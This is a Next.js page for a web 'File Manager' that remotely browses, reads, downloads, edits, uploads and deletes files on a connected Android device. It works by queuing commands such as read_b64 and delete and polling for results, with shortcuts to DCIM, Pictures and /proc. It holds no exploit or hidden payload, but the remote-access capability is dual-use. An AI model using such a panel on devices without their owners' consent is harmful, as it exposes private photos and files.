'use client'
import { Suspense } from 'react'
import { useEffect, useState, useCallback, useRef } from 'react'
import { useSearchParams } from 'next/navigation'
import Sidebar from '@/components/Sidebar'
import {
  Folder, File, ArrowLeft, RefreshCw, HardDrive, Circle,
  ChevronRight, X, Download, Edit3, Save, Trash2, Upload,
  FolderPlus, Image, FileText, Eye, AlertTriangle,
} from 'lucide-react'

interface FileEntry { name: string; type: 'file' | 'dir'; size: string; permissions: string; modified: string }
interface FileListing { path: string; entries: FileEntry[] }
interface DeviceItem { deviceId: string; deviceName: string; connected: boolean }

const IMAGE_EXTS = ['jpg','jpeg','png','gif','webp','bmp']
const TEXT_EXTS  = ['txt','log','json','xml','yaml','yml','ini','cfg','conf','sh','py','js','ts','java','kt','md','csv','html','css','toml','properties']

const isImage = (name: string) => IMAGE_EXTS.includes(name.split('.').pop()?.toLowerCase() ?? '')
const isText  = (name: string) => TEXT_EXTS.includes(name.split('.').pop()?.toLowerCase() ?? '')

const QUICK_PATHS = [
  { label: 'Internal', path: '/storage/emulated/0' },
  { label: 'DCIM',     path: '/storage/emulated/0/DCIM' },
  { label: 'Downloads',path: '/storage/emulated/0/Download' },
  { label: 'Pictures', path: '/storage/emulated/0/Pictures' },
  { label: 'Documents',path: '/storage/emulated/0/Documents' },
  { label: '/sdcard',  path: '/sdcard' },
  { label: '/tmp',     path: '/data/local/tmp' },
  { label: '/proc',    path: '/proc' },
]

interface FileModal {
  path: string
  name: string
  loading: boolean
  error: string
  textContent: string
  b64Content: string
  editing: boolean
  editBuffer: string
  saving: boolean
}

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)) }

function FilesContent() {
  const searchParams = useSearchParams()
  const [devices, setDevices] = useState<DeviceItem[]>([])
  const [selectedId, setSelectedId] = useState<string | null>(searchParams.get('d'))
  const [listing, setListing] = useState<FileListing | null>(null)
  const [path, setPath] = useState('/storage/emulated/0')
  const [navLoading, setNavLoading] = useState(false)
  const [modal, setModal] = useState<FileModal | null>(null)
  const [confirmDelete, setConfirmDelete] = useState<string | null>(null)
  const [newFolderName, setNewFolderName] = useState('')
  const [showNewFolder, setShowNewFolder] = useState(false)
  const [uploadStatus, setUploadStatus] = useState('')
  const uploadRef = useRef<HTMLInputElement>(null)

  const connected = devices.find(d => d.deviceId === selectedId)?.connected ?? false

  const fetchDevices = useCallback(async () => {
    try {
      const res = await fetch('/api/devices')
      const data = await res.json()
      const list: DeviceItem[] = data.devices ?? []
      setDevices(list)
      if (!selectedId && list.length > 0) {
        setSelectedId((list.find(d => d.connected) ?? list[0]).deviceId)
      }
    } catch {}
  }, [selectedId])

  const fetchListing = useCallback(async () => {
    if (!selectedId) return
    try {
      const res = await fetch(`/api/device/files?deviceId=${selectedId}`)
      const data = await res.json()
      if (data.listing) setListing(data.listing)
    } catch {}
  }, [selectedId])

  useEffect(() => { fetchDevices(); const iv = setInterval(fetchDevices, 4000); return () => clearInterval(iv) }, [fetchDevices])
  useEffect(() => { fetchListing(); const iv = setInterval(fetchListing, 3000); return () => clearInterval(iv) }, [fetchListing])

  const navigate = async (targetPath: string) => {
    if (!selectedId) return
    setNavLoading(true)
    setListing(null)
    setPath(targetPath)
    try {
      await fetch('/api/device/files', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, path: targetPath }),
      })
    } finally { setNavLoading(false) }
  }

  const goUp = () => {
    const parts = path.split('/').filter(Boolean)
    if (parts.length <= 1) return
    navigate('/' + parts.slice(0, -1).join('/'))
  }

  const sendAndWait = async (command: string, extraData?: string): Promise<string> => {
    const sentAt = Date.now()
    await fetch('/api/device/command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId: selectedId, command, extra: extraData }),
    })
    await sleep(2500)
    for (let i = 0; i < 20; i++) {
      const r = await fetch(`/api/device/result?deviceId=${selectedId}`)
      const d = await r.json()
      const match = (d.history ?? [])
        .filter((h: { command: string; result: string; timestamp: string }) =>
          h.command === command && new Date(h.timestamp).getTime() > sentAt - 1000
        )
        .sort((a: { timestamp: string }, b: { timestamp: string }) =>
          new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        )[0]
      if (match?.result) return match.result
      await sleep(1500)
    }
    throw new Error('Timeout: no response from device')
  }

  const openFile = async (entry: FileEntry) => {
    const filePath = `${path}/${entry.name}`
    setModal({ path: filePath, name: entry.name, loading: true, error: '', textContent: '', b64Content: '', editing: false, editBuffer: '', saving: false })

    try {
      if (isImage(entry.name)) {
        const b64 = await sendAndWait(`read_b64:${filePath}`)
        if (b64.startsWith('ERROR')) {
          setModal(m => m ? { ...m, loading: false, error: b64 } : null)
        } else {
          const ext = entry.name.split('.').pop()?.toLowerCase() ?? 'jpeg'
          const mime = ext === 'png' ? 'image/png' : ext === 'gif' ? 'image/gif' : ext === 'webp' ? 'image/webp' : 'image/jpeg'
          setModal(m => m ? { ...m, loading: false, b64Content: b64.trim(), textContent: `data:${mime};base64,${b64.trim()}` } : null)
        }
      } else {
        const text = await sendAndWait(`read_text:${filePath}`)
        setModal(m => m ? { ...m, loading: false, textContent: text, editBuffer: text } : null)
      }
    } catch (e) {
      setModal(m => m ? { ...m, loading: false, error: String(e) } : null)
    }
  }

  const saveFile = async () => {
    if (!modal || !selectedId) return
    setModal(m => m ? { ...m, saving: true } : null)
    try {
      const result = await sendAndWait(`write_text:${modal.path}`, modal.editBuffer)
      setModal(m => m ? { ...m, saving: false, editing: false, textContent: modal.editBuffer, error: result.startsWith('ERROR') ? result : '' } : null)
    } catch (e) {
      setModal(m => m ? { ...m, saving: false, error: String(e) } : null)
    }
  }

  const downloadFile = () => {
    if (!modal) return
    if (modal.b64Content) {
      const byteChars = atob(modal.b64Content)
      const bytes = new Uint8Array(byteChars.length)
      for (let i = 0; i < byteChars.length; i++) bytes[i] = byteChars.charCodeAt(i)
      const blob = new Blob([bytes])
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a'); a.href = url; a.download = modal.name; a.click()
      URL.revokeObjectURL(url)
    } else if (modal.textContent) {
      const blob = new Blob([modal.textContent], { type: 'text/plain' })
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a'); a.href = url; a.download = modal.name; a.click()
      URL.revokeObjectURL(url)
    }
  }

  const deleteEntry = async (entryPath: string) => {
    if (!selectedId) return
    setConfirmDelete(null)
    await fetch('/api/device/command', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId: selectedId, command: `delete:${entryPath}` }),
    })
    setModal(null)
    setTimeout(() => navigate(path), 2000)
  }

  const createFolder = async () => {
    if (!selectedId || !newFolderName.trim()) return
    setShowNewFolder(false)
    await fetch('/api/device/command', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId: selectedId, command: `mkdir:${path}/${newFolderName.trim()}` }),
    })
    setNewFolderName('')
    setTimeout(() => navigate(path), 2000)
  }

  const handleUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file || !selectedId) return
    setUploadStatus(`Uploading ${file.name}…`)
    const reader = new FileReader()
    reader.onload = async () => {
      const b64 = (reader.result as string).split(',')[1]
      const destPath = `${path}/${file.name}`
      await fetch('/api/device/command', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command: `write_b64:${destPath}`, extra: b64 }),
      })
      setUploadStatus(`✅ ${file.name} uploaded`)
      setTimeout(() => { setUploadStatus(''); navigate(path) }, 2500)
    }
    reader.readAsDataURL(file)
    if (uploadRef.current) uploadRef.current.value = ''
  }

  const breadcrumbs = path.split('/').filter(Boolean)
  const visibleCrumbs = breadcrumbs.slice(-2)
  const hiddenCount = breadcrumbs.length - visibleCrumbs.length

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />

      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-5xl mx-auto px-3 md:px-6 py-3 md:py-6">

          <div className="flex items-center justify-between mb-3">
            <div>
              <h2 className="text-base md:text-xl font-bold text-white">File Manager</h2>
              <p className="text-android-muted text-xs hidden sm:block">Browse · View · Edit · Download · Upload</p>
            </div>
            <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${connected ? 'text-android-green border-android-green/30 bg-android-green/10' : 'text-android-red border-android-red/30 bg-android-red/10'}`}>
              <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />
              {connected ? 'Online' : 'Offline'}
            </div>
          </div>

          {/* Quick paths */}
          <div className="flex gap-1.5 mb-2 overflow-x-auto pb-1">
            {QUICK_PATHS.map(({ label, path: p }) => (
              <button key={p} onClick={() => navigate(p)} disabled={!connected}
                className="shrink-0 px-2.5 py-1.5 bg-android-surface border border-android-border rounded-lg text-xs text-android-muted hover:text-android-blue hover:border-android-blue/50 transition-colors disabled:opacity-40 font-mono whitespace-nowrap">
                {label}
              </button>
            ))}
          </div>

          {/* Toolbar */}
          <div className="flex gap-2 mb-3">
            <button onClick={() => setShowNewFolder(v => !v)} disabled={!connected}
              className="flex items-center gap-1.5 px-3 py-1.5 bg-android-surface border border-android-border rounded-lg text-xs text-android-muted hover:text-android-text disabled:opacity-40 transition-colors">
              <FolderPlus size={13} /> New Folder
            </button>
            <label className={`flex items-center gap-1.5 px-3 py-1.5 bg-android-surface border border-android-border rounded-lg text-xs cursor-pointer transition-colors ${connected ? 'text-android-muted hover:text-android-text' : 'opacity-40 pointer-events-none'}`}>
              <Upload size={13} /> Upload File
              <input ref={uploadRef} type="file" className="hidden" onChange={handleUpload} disabled={!connected} />
            </label>
            {uploadStatus && <span className="text-xs text-android-green flex items-center">{uploadStatus}</span>}
          </div>

          {showNewFolder && (
            <div className="flex gap-2 mb-3">
              <input value={newFolderName} onChange={e => setNewFolderName(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && createFolder()}
                placeholder="Folder name…"
                className="flex-1 bg-android-surface border border-android-border rounded-lg px-3 py-1.5 text-xs text-android-text outline-none focus:border-android-green font-mono" />
              <button onClick={createFolder} className="px-3 py-1.5 bg-android-green text-android-bg rounded-lg text-xs font-semibold">Create</button>
              <button onClick={() => setShowNewFolder(false)} className="px-3 py-1.5 bg-android-surface border border-android-border rounded-lg text-xs text-android-muted">Cancel</button>
            </div>
          )}

          {/* File browser */}
          <div className="bg-android-surface border border-android-border rounded-xl overflow-hidden">
            {/* Path bar */}
            <div className="px-3 py-2.5 border-b border-android-border flex items-center gap-2">
              <button onClick={goUp} disabled={!connected || path === '/'} className="p-1.5 rounded-lg hover:bg-android-border/50 disabled:opacity-30 transition-colors shrink-0">
                <ArrowLeft size={15} className="text-android-muted" />
              </button>
              <div className="flex items-center gap-1 flex-1 overflow-hidden text-xs">
                <HardDrive size={12} className="text-android-muted shrink-0" />
                {hiddenCount > 0 && <span className="text-android-muted shrink-0">…</span>}
                {visibleCrumbs.map((part, i) => {
                  const idx = hiddenCount + i
                  return (
                    <span key={idx} className="flex items-center gap-1 shrink-0">
                      <ChevronRight size={12} className="text-android-border shrink-0" />
                      <button onClick={() => navigate('/' + breadcrumbs.slice(0, idx + 1).join('/'))}
                        className="text-android-text hover:text-android-blue font-mono transition-colors truncate max-w-[80px] md:max-w-none">
                        {part}
                      </button>
                    </span>
                  )
                })}
              </div>
              <button onClick={() => navigate(path)} disabled={!connected} className="p-1.5 rounded-lg hover:bg-android-border/50 disabled:opacity-30 transition-colors shrink-0">
                <RefreshCw size={13} className="text-android-muted" />
              </button>
            </div>

            {!connected ? (
              <div className="p-10 text-center"><HardDrive size={32} className="text-android-border mx-auto mb-3" /><p className="text-android-muted text-sm">Connect your device to browse files</p></div>
            ) : navLoading ? (
              <div className="p-10 text-center"><RefreshCw size={22} className="text-android-green mx-auto mb-3 animate-spin" /><p className="text-android-muted text-sm">Loading…</p></div>
            ) : listing && listing.entries.length > 0 ? (
              <div className="divide-y divide-android-border/50">
                {listing.entries
                  .sort((a, b) => { if (a.type === 'dir' && b.type !== 'dir') return -1; if (a.type !== 'dir' && b.type === 'dir') return 1; return a.name.localeCompare(b.name) })
                  .map(entry => (
                    <div key={entry.name} className="flex items-center gap-3 px-4 py-3 hover:bg-white/5 active:bg-white/10 group transition-colors">
                      <div className="cursor-pointer flex items-center gap-3 flex-1 min-w-0"
                        onClick={() => entry.type === 'dir' ? navigate(`${path}/${entry.name}`) : openFile(entry)}>
                        {entry.type === 'dir' ? (
                          <Folder size={17} className="text-android-yellow shrink-0" />
                        ) : isImage(entry.name) ? (
                          <Image size={17} className="text-android-blue shrink-0" />
                        ) : (
                          <FileText size={17} className="text-android-muted shrink-0" />
                        )}
                        <div className="flex-1 min-w-0">
                          <p className="text-sm text-android-text font-medium truncate">{entry.name}</p>
                          <p className="text-xs text-android-muted font-mono">{entry.size} {entry.modified && `· ${entry.modified}`}</p>
                        </div>
                      </div>
                      <div className="flex items-center gap-1 shrink-0">
                        {entry.type === 'dir' ? (
                          <ChevronRight size={14} className="text-android-border" />
                        ) : (
                          <>
                            <button onClick={() => openFile(entry)} title="View/Edit"
                              className="p-1.5 rounded-lg text-android-muted hover:text-android-blue hover:bg-android-blue/10 transition-colors opacity-0 group-hover:opacity-100">
                              <Eye size={13} />
                            </button>
                            <button onClick={() => setConfirmDelete(`${path}/${entry.name}`)} title="Delete"
                              className="p-1.5 rounded-lg text-android-muted hover:text-android-red hover:bg-android-red/10 transition-colors opacity-0 group-hover:opacity-100">
                              <Trash2 size={13} />
                            </button>
                          </>
                        )}
                      </div>
                    </div>
                  ))}
              </div>
            ) : (
              <div className="p-10 text-center">
                <Folder size={32} className="text-android-border mx-auto mb-3" />
                <p className="text-android-muted text-sm">{listing ? 'Empty folder or access denied' : 'Navigate to a folder to see its contents'}</p>
                {connected && !listing && (
                  <button onClick={() => navigate(path)} className="mt-4 px-4 py-2 bg-android-green text-android-bg rounded-lg text-sm font-medium">
                    Browse {path.split('/').pop()}
                  </button>
                )}
              </div>
            )}
          </div>

          <p className="text-xs text-android-muted mt-2 hidden md:block">Tap folder to navigate · Tap file to view/edit · Hover for actions</p>
        </div>
      </main>

      {/* ── FILE VIEWER MODAL ── */}
      {modal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 px-3 py-4" onClick={e => { if (e.target === e.currentTarget) setModal(null) }}>
          <div className="bg-android-surface border border-android-border rounded-2xl w-full max-w-2xl max-h-[90vh] flex flex-col">
            {/* Modal header */}
            <div className="flex items-center gap-3 px-4 py-3 border-b border-android-border shrink-0">
              {isImage(modal.name) ? <Image size={16} className="text-android-blue shrink-0" /> : <FileText size={16} className="text-android-muted shrink-0" />}
              <span className="flex-1 font-mono text-sm text-android-text truncate">{modal.name}</span>
              <div className="flex items-center gap-1">
                {!modal.loading && !modal.error && (
                  <>
                    <button onClick={downloadFile} title="Download"
                      className="p-1.5 rounded-lg text-android-muted hover:text-android-blue hover:bg-android-blue/10 transition-colors">
                      <Download size={14} />
                    </button>
                    {!isImage(modal.name) && !modal.editing && (
                      <button onClick={() => setModal(m => m ? { ...m, editing: true, editBuffer: m.textContent } : null)} title="Edit"
                        className="p-1.5 rounded-lg text-android-muted hover:text-android-green hover:bg-android-green/10 transition-colors">
                        <Edit3 size={14} />
                      </button>
                    )}
                    {modal.editing && (
                      <button onClick={saveFile} disabled={modal.saving} title="Save"
                        className="flex items-center gap-1 px-3 py-1 bg-android-green text-android-bg rounded-lg text-xs font-semibold disabled:opacity-60">
                        {modal.saving ? <RefreshCw size={12} className="animate-spin" /> : <Save size={12} />}
                        {modal.saving ? 'Saving…' : 'Save'}
                      </button>
                    )}
                    <button onClick={() => setConfirmDelete(modal.path)} title="Delete"
                      className="p-1.5 rounded-lg text-android-muted hover:text-android-red hover:bg-android-red/10 transition-colors">
                      <Trash2 size={14} />
                    </button>
                  </>
                )}
                <button onClick={() => setModal(null)} className="p-1.5 rounded-lg text-android-muted hover:text-android-text hover:bg-android-border/50 transition-colors">
                  <X size={16} />
                </button>
              </div>
            </div>

            {/* Modal body */}
            <div className="flex-1 overflow-auto p-4 min-h-0">
              {modal.loading ? (
                <div className="flex flex-col items-center justify-center h-32 gap-3">
                  <RefreshCw size={24} className="text-android-green animate-spin" />
                  <p className="text-android-muted text-sm">Loading file from device…</p>
                </div>
              ) : modal.error ? (
                <div className="flex flex-col items-center justify-center h-32 gap-3">
                  <AlertTriangle size={24} className="text-android-red" />
                  <p className="text-android-red text-sm">{modal.error}</p>
                </div>
              ) : isImage(modal.name) ? (
                <img src={modal.textContent} alt={modal.name} className="max-w-full mx-auto rounded-lg" />
              ) : modal.editing ? (
                <textarea
                  value={modal.editBuffer}
                  onChange={e => setModal(m => m ? { ...m, editBuffer: e.target.value } : null)}
                  className="w-full h-96 bg-android-bg border border-android-border rounded-lg p-3 text-xs font-mono text-android-text outline-none focus:border-android-green resize-none"
                  spellCheck={false}
                />
              ) : (
                <pre className="text-xs font-mono text-android-text whitespace-pre-wrap break-all leading-5">{modal.textContent}</pre>
              )}
            </div>

            {/* Path footer */}
            <div className="px-4 py-2 border-t border-android-border shrink-0">
              <p className="text-xs font-mono text-android-muted truncate">{modal.path}</p>
            </div>
          </div>
        </div>
      )}

      {/* ── DELETE CONFIRM ── */}
      {confirmDelete && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 px-4">
          <div className="bg-android-surface border border-android-border rounded-2xl p-6 w-full max-w-sm">
            <div className="flex items-center gap-3 mb-4">
              <Trash2 size={20} className="text-android-red shrink-0" />
              <p className="text-android-text font-semibold">Delete file?</p>
            </div>
            <p className="text-android-muted text-xs font-mono mb-5 break-all">{confirmDelete}</p>
            <div className="flex gap-3">
              <button onClick={() => deleteEntry(confirmDelete)}
                className="flex-1 py-2 bg-android-red text-white rounded-xl text-sm font-semibold">Delete</button>
              <button onClick={() => setConfirmDelete(null)}
                className="flex-1 py-2 bg-android-border text-android-text rounded-xl text-sm">Cancel</button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

export default function FilesPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <FilesContent />
    </Suspense>
  )
}
